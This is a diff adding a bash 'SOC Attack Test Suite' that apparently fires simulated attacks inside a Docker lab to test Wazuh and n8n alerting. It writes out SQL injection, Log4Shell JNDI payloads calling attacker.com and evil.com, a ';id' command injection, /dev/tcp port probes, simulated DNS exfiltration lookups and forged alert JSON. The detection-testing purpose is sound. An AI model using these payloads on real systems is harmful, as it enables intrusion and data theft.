@@ -1,0 +1,410 @@
+#!/usr/bin/env bash
+set -euo pipefail
+
+COMPOSE_BIN="docker compose"
+CURL_SVC="curl"
+BASE_URL="http://server-app"
+LDAP_HOST_1="attacker.com"
+LDAP_HOST_2="evil.com"
+
+dc_exec() {
+  $COMPOSE_BIN exec -T "$1" "${@:2}"
+}
+
+print_header() {
+  clear || true
+  echo "   _____                      _ _         "
+  echo "  / ____|                    (_) |        "
+  echo " | (___   ___  ___ _   _ _ __ _| |_ _   _ "
+  echo "  \\___ \\ / _ \\/ __| | | | '__| | __| | | |"
+  echo "  ____) |  __/ (__| |_| | |  | | |_| |_| |"
+  echo " |_____/ \\___|\\___|\\__,_|_|  |_|\\__|\\__, |"
+  echo "                                     __/ |"
+  echo "                                    |___/ "
+  echo
+  echo "SOC Attack Test Suite"
+  echo "Compose : $COMPOSE_BIN"
+  echo "Service : $CURL_SVC"
+  echo "Base URL: $BASE_URL"
+  echo
+}
+
+test_sqli_name="SQL Injection"
+test_struts_name="Apache Struts2 style POST"
+test_log4shell_q_name="Log4Shell via query string"
+test_log4shell_ua_name="Log4Shell via User-Agent"
+test_roles_name="Tests d'acces roles"
+test_dns_name="Trafic DNS / HTTP sortant"
+test_scan_ports_name="Scan de ports simple"
+test_webhook_n8n_name="Test Webhook n8n"
+test_command_injection_name="Command Injection"
+test_network_service_scanning_name="Scan MITRE realiste"
+test_dns_exfiltration_name="Scan MITRE realiste"
+test_mitre_t1059_name="Simulation MITRE T1059"
+test_mitre_t1046_name="Simulation MITRE T1046"
+test_mitre_t1048_name="Simulation MITRE T1048"
+
+test_sqli() {
+  echo "[+] SQL Injection"
+  dc_exec "$CURL_SVC" curl -sS "${BASE_URL}/login?user=admin&pass=%27%20OR%201%3D1" >/dev/null || true
+  echo "[OK] Test termine"
+}
+
+test_struts() {
+  echo "[+] Apache Struts2 style POST"
+  dc_exec "$CURL_SVC" curl -sS -X POST \
+    -H "Content-Type: multipart/form-data" \
+    -F "file=@/etc/hosts" \
+    "${BASE_URL}/" >/dev/null || true
+  echo "[OK] Test termine"
+}
+
+test_log4shell_q() {
+  echo "[+] Log4Shell via query string"
+  dc_exec "$CURL_SVC" curl -sS \
+    "${BASE_URL}/search?q=\${jndi:ldap://${LDAP_HOST_1}/lab_test}" >/dev/null || true
+  echo "[OK] Test termine"
+}
+
+test_log4shell_ua() {
+  echo "[+] Log4Shell via User-Agent"
+  dc_exec "$CURL_SVC" curl -sS \
+    -H "User-Agent: \${jndi:ldap://${LDAP_HOST_2}/lab_test}" \
+    "${BASE_URL}/" >/dev/null 2>&1 || true
+  echo "[OK] Test termine"
+}
+
+test_roles() {
+  echo "[+] Tests d'acces roles"
+
+  echo "  - employee -> /employee"
+  dc_exec "$CURL_SVC" curl -sS -u employee:employee "${BASE_URL}/employee" >/dev/null || true
+
+  echo "  - employee -> /user"
+  dc_exec "$CURL_SVC" curl -sS -u employee:employee "${BASE_URL}/user" >/dev/null || true
+
+  echo "  - employee -> /admin"
+  dc_exec "$CURL_SVC" curl -sS -u employee:employee "${BASE_URL}/admin" >/dev/null || true
+
+  echo "  - admin -> /employee"
+  dc_exec "$CURL_SVC" curl -sS -u admin:admin "${BASE_URL}/employee" >/dev/null || true
+
+  echo "  - admin -> /user"
+  dc_exec "$CURL_SVC" curl -sS -u admin:admin "${BASE_URL}/user" >/dev/null || true
+
+  echo "  - admin -> /admin"
+  dc_exec "$CURL_SVC" curl -sS -u admin:admin "${BASE_URL}/admin" >/dev/null || true
+
+  echo "  - user -> /user"
+  dc_exec "$CURL_SVC" curl -sS -u user:user "${BASE_URL}/user" >/dev/null || true
+
+  echo "  - user -> /employee"
+  dc_exec "$CURL_SVC" curl -sS -u user:user "${BASE_URL}/employee" >/dev/null || true
+
+  echo "  - user -> /admin"
+  dc_exec "$CURL_SVC" curl -sS -u user:user "${BASE_URL}/admin" >/dev/null || true
+
+  echo "[OK] Test termine"
+}
+
+test_dns() {
+  echo "[+] Trafic DNS / HTTP sortant"
+  dc_exec "$CURL_SVC" curl -sS http://google.com >/dev/null || true
+  echo "[OK] Test termine"
+}
+
+test_scan_ports() {
+  echo "[+] Scan de ports simple"
+  for port in 80 443 9200 3001; do
+    echo "  - test port $port"
+    dc_exec "$CURL_SVC" bash -c "timeout 1 bash -c '</dev/tcp/server-app/$port'" >/dev/null 2>&1 || true
+  done
+  echo "[OK] Test termine"
+}
+
+test_webhook_n8n() {
+  echo "[+] Test Webhook n8n (alert injection)"
+
+  dc_exec "$CURL_SVC" curl -sS -X POST http://n8n:5678/webhook/wazuh-alert \
+    -H "Content-Type: application/json" \
+    -d '{
+      "full_log": "test from attack script",
+      "rule_id": "99999",
+      "rule_description": "Manual webhook test",
+      "agent_name": "wazuh.agent",
+      "agent_id": "001",
+      "src_ip": "122.224.240.99",
+      "raw": {
+        "rule": {
+          "id": "99999",
+          "level": 12,
+          "description": "Manual webhook test"
+        },
+        "agent": {
+          "id": "001",
+          "name": "wazuh.agent"
+        },
+        "data": {
+          "src_ip": "122.224.240.99"
+        }
+      }
+    }' >/dev/null || true
+
+  echo "[OK] Webhook test envoyé"
+}
+
+test_command_injection() {
+  echo "[+] Command Injection"
+  dc_exec "$CURL_SVC" sh -c 'curl -s "http://server-app/?input=;id" > /dev/null || true'
+  echo "[OK] Test termine"
+}
+
+test_network_service_scanning() {
+  echo "[+] Scan detecte (bruyant)"
+
+  dc_exec "$CURL_SVC" sh -c '
+    for i in {1..20}; do
+      curl -s http://server-app:80 > /dev/null
+      curl -s http://server-app:443 > /dev/null
+      curl -s http://server-app:9200 > /dev/null
+      curl -s http://server-app:3001 > /dev/null
+    done
+  ' || true
+
+  echo "[OK] Scan termine"
+}
+
+test_dns_exfiltration() {
+  echo "[+] Exfiltration DNS simulee"
+  dc_exec "$CURL_SVC" sh -c 'nslookup secret-data.attacker.com >/dev/null 2>&1 || true'
+  dc_exec "$CURL_SVC" sh -c 'nslookup exfil-1234.evil.com >/dev/null 2>&1 || true'
+  echo "[OK] Test termine"
+}
+
+test_mitre_t1046() {
+  echo "[+] Simulation brute T1046 envoyee a n8n"
+
+  dc_exec "$CURL_SVC" sh -c 'curl -s -X POST http://n8n:5678/webhook/wazuh-alert \
+    -H "Content-Type: application/json" \
+    -d "{
+      \"rule\": {
+        \"id\": \"100013\",
+        \"level\": 10,
+        \"description\": \"Multiple connection attempts detected\"
+      },
+      \"agent\": {
+        \"name\": \"wazuh.agent\",
+        \"id\": \"001\"
+      },
+      \"manager\": {
+        \"name\": \"wazuh.manager\"
+      },
+      \"src_ip\": \"45.148.10.121\",
+      \"dest_ip\": \"172.23.0.7\",
+      \"full_log\": \"Multiple connection attempts from 45.148.10.121 to 172.23.0.7 on ports 80,443,9200,3001\",
+      \"raw\": {
+        \"data\": {
+          \"srcip\": \"45.148.10.121\",
+          \"destip\": \"172.23.0.7\",
+          \"ports\": \"80,443,9200,3001\",
+          \"proto\": \"TCP\"
+        }
+      }
+    }" > /dev/null || true'
+
+  echo "[OK] Alerte brute T1046 envoyee"
+}
+
+
+test_mitre_t1048() {
+  echo "[+] Simulation brute T1048 envoyee a n8n"
+
+  dc_exec "$CURL_SVC" sh -c 'curl -s -X POST http://n8n:5678/webhook/wazuh-alert \
+    -H "Content-Type: application/json" \
+    -d "{
+      \"rule\": {
+        \"id\": \"100014\",
+        \"level\": 11,
+        \"description\": \"Suspicious DNS activity detected\"
+      },
+      \"agent\": {
+        \"name\": \"wazuh.agent\",
+        \"id\": \"001\"
+      },
+      \"manager\": {
+        \"name\": \"wazuh.manager\"
+      },
+      \"src_ip\": \"172.23.0.2\",
+      \"dest_ip\": \"45.148.10.67\",
+      \"full_log\": \"DNS query observed from 172.23.0.2 to 45.148.10.67 for secret-data.attacker.com\",
+      \"raw\": {
+        \"data\": {
+          \"srcip\": \"172.23.0.2\",
+          \"destip\": \"45.148.10.67\",
+          \"proto\": \"DNS\",
+          \"query\": \"secret-data.attacker.com\"
+        }
+      }
+    }" > /dev/null || true'
+
+  echo "[OK] Alerte brute envoyee"
+}
+
+test_mitre_t1059() {
+  echo "[+] Simulation brute T1059 envoyee a n8n"
+
+  dc_exec "$CURL_SVC" sh -c 'curl -s -X POST http://n8n:5678/webhook/wazuh-alert \
+    -H "Content-Type: application/json" \
+    -d "{
+      \"rule\": {
+        \"id\": \"100012\",
+        \"level\": 12,
+        \"description\": \"Suspicious command execution detected\"
+      },
+      \"agent\": {
+        \"name\": \"wazuh.agent\",
+        \"id\": \"001\"
+      },
+      \"manager\": {
+        \"name\": \"wazuh.manager\"
+      },
+      \"src_ip\": \"45.148.10.67\",
+      \"dest_ip\": \"172.23.0.14\",
+      \"full_log\": \"Command execution observed: id; whoami from 45.148.10.67 to 172.23.0.14\",
+      \"raw\": {
+        \"data\": {
+          \"srcip\": \"45.148.10.67\",
+          \"destip\": \"172.23.0.14\",
+          \"command\": \"id; whoami\",
+          \"proto\": \"HTTP\"
+        }
+      }
+    }" > /dev/null || true'
+
+  echo "[OK] Alerte brute T1059 envoyee"
+}
+
+run_all() {
+  test_sqli
+  test_struts
+  test_log4shell_q
+  test_log4shell_ua
+  test_roles
+  test_dns
+  test_scan_ports
+  test_webhook_n8n
+  test_command_injection
+  test_network_service_scanning
+  test_dns_exfiltration
+  test_mitre_t1059
+  test_mitre_t1046
+  test_mitre_t1048
+}
+
+show_list() {
+  echo
+  echo "Tests disponibles :"
+  echo "  -1   $test_sqli_name"
+  echo "  -2   $test_struts_name"
+  echo "  -3   $test_log4shell_q_name"
+  echo "  -4   $test_log4shell_ua_name"
+  echo "  -5   $test_roles_name"
+  echo "  -6   $test_dns_name"
+  echo "  -7   $test_scan_ports_name"
+  echo "  -8   $test_webhook_n8n_name"
+  echo "  -9   $test_command_injection_name"
+  echo "  -10  $test_network_service_scanning_name"
+  echo "  -11  $test_dns_exfiltration_name"
+  echo "  -12  $test_mitre_t1059_name"
+  echo "  -13  $test_mitre_t1046_name"
+  echo "  -14  $test_mitre_t1048_name"
+  echo "  -99  Tout lancer"
+  echo
+}
+
+pause_screen() {
+  echo
+  read -rp "Appuyez sur Entree pour continuer..." _
+}
+
+interactive_menu() {
+  while true; do
+    print_header
+    echo "Choisissez un test :"
+    echo
+    echo "  1) $test_sqli_name"
+    echo "  2) $test_struts_name"
+    echo "  3) $test_log4shell_q_name"
+    echo "  4) $test_log4shell_ua_name"
+    echo "  5) $test_roles_name"
+    echo "  6) $test_dns_name"
+    echo "  7) $test_scan_ports_name"
+    echo "  8) Test Webhook n8n"
+    echo "  9) Command Injection"
+    echo "  10) Scan MITRE realiste"
+    echo "  11) DNS Exfiltration"
+    echo "  12) Simulation MITRE T1059"
+    echo "  13) Simulation MITRE T1046"
+    echo "  14) Simulation MITRE T1048"
+    echo "  99) Tout lancer"
+    echo "  0) Quitter"
+    echo
+
+    read -rp "Votre choix : " choice
+    echo
+
+    case "$choice" in
+      1) test_sqli; pause_screen ;;
+      2) test_struts; pause_screen ;;
+      3) test_log4shell_q; pause_screen ;;
+      4) test_log4shell_ua; pause_screen ;;
+      5) test_roles; pause_screen ;;
+      6) test_dns; pause_screen ;;
+      7) test_scan_ports; pause_screen ;;
+      8) test_webhook_n8n; pause_screen ;;
+      9) test_command_injection ;;
+      10) test_network_service_scanning ;;
+      11) test_dns_exfiltration ;;
+      12) test_mitre_t1059 ;;
+      13) test_mitre_t1046 ;;
+      14) test_mitre_t1048 ;;
+      99) run_all; pause_screen ;;
+      0) exit 0 ;;
+      *) echo "Choix invalide."; pause_screen ;;
+    esac
+  done
+}
+
+ARGS=()
+while [[ $# -gt 0 ]]; do
+  case "$1" in
+    --compose) COMPOSE_BIN="$2"; shift 2 ;;
+    --svc) CURL_SVC="$2"; shift 2 ;;
+    --base) BASE_URL="$2"; shift 2 ;;
+    --ldap1) LDAP_HOST_1="$2"; shift 2 ;;
+    --ldap2) LDAP_HOST_2="$2"; shift 2 ;;
+    --list|-l|--help|-h) show_list; exit 0 ;;
+    *) ARGS+=("$1"); shift ;;
+  esac
+done
+
+set -- "${ARGS[@]}"
+
+if [[ $# -eq 0 ]]; then
+  interactive_menu
+fi
+
+for arg in "$@"; do
+  case "$arg" in
+    -1) test_sqli ;;
+    -2) test_struts ;;
+    -3) test_log4shell_q ;;
+    -4) test_log4shell_ua ;;
+    -5) test_roles ;;
+    -6) test_dns ;;
+    -7) test_scan_ports ;;
+    -8) test_webhook_n8n ;;
+    -99) run_all ;;
+    *) echo "Argument inconnu : $arg" >&2; show_list; exit 1 ;;
+  esac
+done
